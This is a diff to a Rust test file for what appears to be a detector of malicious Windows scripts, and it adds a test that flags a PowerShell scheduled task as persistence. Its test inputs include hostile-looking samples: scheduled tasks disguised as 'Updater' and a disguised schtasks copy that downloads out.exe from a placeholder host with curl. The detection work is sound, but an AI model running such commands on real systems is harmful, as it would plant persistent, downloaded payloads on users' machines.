@@ -2699,6 +2699,26 @@ schtasks /create /tn "Updater" /tr "cmd /V:ON /c set U=https://schtasks.example/
     }
 
     #[test]
+    fn powershell_multiline_scheduled_task_action_variable_emits_persistence_trait() {
+        let script = br#"$a = New-ScheduledTaskAction -Execute 'cmd.exe' -Argument '/c calc.exe'
+Register-ScheduledTask -TaskName Updater -Action $a -Force
+"#;
+        let report = analyze(script, &AnalyzeConfig::default());
+
+        assert!(
+            report.traits.iter().any(|t| matches!(
+                t,
+                Trait::Persistence { hive, key, command, .. }
+                    if hive == "ScheduledTask"
+                        && key == "Updater"
+                        && command == "cmd.exe /c calc.exe"
+            )),
+            "multi-line PowerShell scheduled-task action missing: {:?}",
+            report.traits
+        );
+    }
+
+    #[test]
     fn copied_schtasks_alias_create_tr_recurses_into_nested_download() {
         let script = br#"copy C:\Windows\System32\schtasks.exe C:\Users\Public\st.tmp
 C:\Users\Public\st.tmp /create /tn "Updater" /tr "cmd /c curl -o out.exe https://copied-schtasks.example/p.exe" /sc once /st 00:00 /f
